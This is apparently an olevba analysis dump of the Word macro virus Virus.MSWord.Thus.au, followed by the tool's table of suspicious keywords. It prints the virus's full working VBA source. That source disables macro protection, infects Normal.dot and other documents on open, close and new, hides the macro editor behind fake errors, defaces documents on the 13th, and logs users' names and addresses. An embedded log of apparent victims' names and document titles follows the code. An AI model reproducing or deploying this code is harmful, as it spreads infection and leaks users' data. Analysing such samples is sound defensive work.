olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.au-fcddcfa690df00a8d40b9e3348afe9c51e38ad21
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.au-fcddcfa690df00a8d40b9e3348afe9c51e38ad21 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Thus_001'
'---------------------------------------------------------------------
'Tomato
StartPos = 87
On Error GoTo Exit1
VirusProtection = False
SaveNormalPrompt = False
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If Day(Now) = 13 Then Trojan
If (ad.Lines(4, 1) <> "'Tomato") Or (ad.Lines(2, 1) = "''Thus_001'") Or (ad.Lines(2, 1) = "''Thus_001'") Then
    LogInfo
    If ad.CountOfLines > 0 Then ad.DeleteLines 1, ad.CountOfLines
    s = nt.Lines(1, nt.CountOfLines)
    ad.InsertLines 1, s
    ad.ReplaceLine 45, "Sub ViewVBCode1()"
    ad.ReplaceLine 49, "Sub ToolsMacro1()"
    virus_col = Val(Mid(nt.Lines(StartPos, 1), 9, 4)) + 1
    nt.ReplaceLine StartPos, Mid(nt.Lines(StartPos, 1), 1, 8) + Str(virus_col)
    ad.ReplaceLine StartPos, "' Êîïèÿ¹ 0000"
    ActiveDocument.Save
End If
If (nt.Lines(4, 1) <> "'Tomato") Or (nt.Lines(2, 1) = "''Thus_001'") Or (ad.Lines(2, 1) = "''Thus_001'") Then
    If nt.CountOfLines > 0 Then nt.DeleteLines 1, nt.CountOfLines
    s = ad.Lines(1, ad.CountOfLines)
    nt.InsertLines 1, s
    nt.ReplaceLine 45, "Sub ViewVBCode()"
    nt.ReplaceLine 49, "Sub ToolsMacro()"
    virus_col = Val(Mid(nt.Lines(StartPos, 1), 9, 4)) + 1
    nt.ReplaceLine StartPos, Mid(nt.Lines(StartPos, 1), 1, 8) + Str(virus_col)
End If
NormalTemplate.Save
Exit1:
End Sub

Private Sub Document_New()
    Document_Close
End Sub

Private Sub Document_Open()
    Document_Close
End Sub
 
Sub ViewVBCode()
    MsgBox "Îøèáêà èíèöèàëèçàöè MS Visual Basic", vbCritical
End Sub

Sub ToolsMacro()
    MsgBox "Îøèáêà èíèöèàëèçàöè MS Visual Basic", vbCritical
End Sub

Private Sub Trojan()
    Application.Caption = "Ñàìûé îòñòîéíûé äîêóìåíò"
    For i = 1 To 10
        Application.CommandBars.Item(i).Visible = False
    Next i
    ActiveDocument.Shapes.AddShape(6, 150, 150, 300, 300).Fill.ForeColor.RGB = RGB(255, 0, 0)
    ActiveDocument.Shapes.AddShape(1, 200, 260, 200, 70).Fill.ForeColor.RGB = RGB(255, 255, 255)
    ActiveDocument.Shapes.Item(2).TextFrame.TextRange.Font.Size = 46
    ActiveDocument.Shapes.Item(2).TextFrame.TextRange.Font.ColorIndex = wdRed
    ActiveDocument.Shapes.Item(2).TextFrame.TextRange.Text = "Ïîìèäîð"
    ActiveDocument.Save
End Sub

Private Sub LogInfo()
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    Log_s = "' " & Time & " - " & Format(Date, "dddd, d mmm yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & ActiveDocument.Name & Chr(13) & "' " & Application.UserAddress & Chr(13) & "' "
    FindFirstLog = 1
    While nt.Lines(FindFirstLog, 1) <> "' Log:"
        FindFirstLog = FindFirstLog + 1
    Wend
    If nt.CountOfLines > 315 Then nt.DeleteLines FindFirstLog + 1, 5
    nt.InsertLines nt.CountOfLines + 5, Log_s
    If Day(Now) = 13 Then
        Open "c:\Ïîìèäîð.log" For Output As #1
        Print #1, "Log ôàéë âèðóñà Ïîìèäîðêà"
        Print #1, "CopyRight (c) Lander Fox"
        Print #1, "All rigth reserved" + Chr(13)
        For i = FindFirstLog + 1 To nt.CountOfLines
            Print #1, nt.Lines(i, 1)
        Next i
        Close #1
    End If
End Sub

' Êîïèÿ¹ 2
'
' Log:
' 23:06:19 - ïÿòíèöà, 2 èþí 2000
' Ï÷åëà Âàñÿ
' Ãëàâà 5.doc
'
'
' 8:19:53 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Òèòóë2.rtf
'
'
' 8:22:16 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Titul.doc
'
'
' 8:23:42 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Plug&Play.doc
'
'
' 9:55:40 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Êí-äèïë.doc
'
'
' 13:38:08 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Ingenerka.rtf
'
'
' 14:50:50 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' ËÈÒÅÐÀÒÓÐÀ.doc
'
'
' 17:22:00 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Ïðèëîæåíèå1.doc
'
'
' 17:25:05 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Äîêóìåíò1
'
'
' 17:28:31 - ñóááîòà, 3 èþí 2000
' Ï÷åëà Âàñÿ
' Ïðèëîæåíèå1.doc
'
'
' 11:34:43 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' Äîêóìåíò1
'
'
' 12:40:31 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' Äîêóìåíò1
'
'
' 12:44:40 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' Äîêóìåíò1
'
'
' 12:44:56 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' ãëàâà3.doc
'
'
' 13:26:25 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' ÿ ëþáèìàÿ.rtf
'
'
' 13:42:07 - âîñêðåñåíüå, 4 èþí 2000
' Ï÷åëà Âàñÿ
' ZAJAV.DOC
'
'
' 16:53:21 - ïÿòíèöà, 2 èþí 2000
' Vadim
' Êí-äèïë.doc
'
'
' 17:15:28 - ïÿòíèöà, 2 èþí 2000
' Vadim
' Çàêëþ÷åíèå (äèï).doc
'
'
' 18:47:42 - ïÿòíèöà, 2 èþí 2000
' Vadim
' report_Ðàñ÷åò ôèí. ïëàíà.doc
'
'
' 8:38:25 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' Äîêóìåíò1
'
'
' 8:42:42 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' ïèñ îòãðÑÒÄ 23 05.doc
'
'
' 14:05:42 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' ÐÅ×Ü (äèï).doc
'
'
' 14:32:24 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' Ãëàâ.áóõ.ÒÄ ÂÇ Ëûñüâ 11.04.doc
'
'
' 15:07:54 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' Êîð÷àãàíîâó 17.01..doc
'
'
' 15:13:36 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' Ãëàâ.áóõ.ÒÄ ÂÇ Êîíñòð 19.04.doc
'
'
' 15:30:58 - ïîíåäåëüíèê, 5 èþí 2000
' Vadim
' ÄÈÏËÎÌ.doc
'
'
' 18:54:44 - ñðåäà, 7 èþí 2000
' Sergey
' Ïðèáûëè -óáûòêè (äèï).doc
'
'
' 18:54:58 - ñðåäà, 7 èþí 2000
' Sergey
' Êýø-ôëî (äèï).doc
'
'
' 18:55:08 - ñðåäà, 7 èþí 2000
' Sergey
' Ôèíàíñîâûå ïîêàçàòåëè (äèï).doc
'
'
' 18:55:25 - ñðåäà, 7 èþí 2000
' Sergey
' Áàëàíñ (äèï).doc
'
'
' 18:55:46 - ñðåäà, 7 èþí 2000
' Sergey
' ÏËÀÍÎÂÀß ÊÀËÜÊÓËßÖÈß ÑÅÁÅÑÒÎÈÌÎÑÒÈ.doc
'
'
' 11:51:49 - ÷åòâåðã, 8 èþí 2000
' Sergey
' Ôèíàíñîâûå ïîêàçàòåëè (äèï).doc
'
'
' 11:51:58 - ÷åòâåðã, 8 èþí 2000
' Sergey
' Áàëàíñ (äèï).doc
'
'
' 11:52:09 - ÷åòâåðã, 8 èþí 2000
' Sergey
' ÏËÀÍÎÂÀß ÊÀËÜÊÓËßÖÈß ÑÅÁÅÑÒÎÈÌÎÑÒÈ.doc
'
'
' 10:46:12 - ïÿòíèöà, 9 èþí 2000
' Sergey
' MH000024.doc
'
'
' 10:58:49 - ïÿòíèöà, 9 èþí 2000
' Sergey
' MH000026.doc
'
'
' 9:46:43 - âòîðíèê, 13 èþí 2000
' Sergey
' Äîêóìåíò1.doc
'
'
' 9:47:47 - âòîðíèê, 13 èþí 2000
' Sergey
' Îðõèäåêòîìèÿ.doc
'
'
' 10:23:03 - âòîðíèê, 13 èþí 2000
' Sergey
' Ìèíèñòåðñòâî ñåëüñêîãî õîçÿéñòâà è ïðîäîâîëüñòâèÿ.doc
'
'
' 18:15:04 - Tuesday, 1 Aug 2000
' Replication System
' DOC10.DOC
'
'
' 18:15:15 - Tuesday, 1 Aug 2000
' Replication System
' DOC11.DOC
'
'
' 18:15:25 - Tuesday, 1 Aug 2000
' Replication System
' DOC12.DOC
'
'
' 18:15:33 - Tuesday, 1 Aug 2000
' Replication System
' DOC13.DOC
'
'
' 18:15:42 - Tuesday, 1 Aug 2000
' Replication System
' DOC14.DOC
'
'
' 18:15:51 - Tuesday, 1 Aug 2000
' Replication System
' DOC7.DOC
'
'
' 11:03:25 AM - Monday, 11 Sep 2000
' Ditry PC
' sample1.doc
'
'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
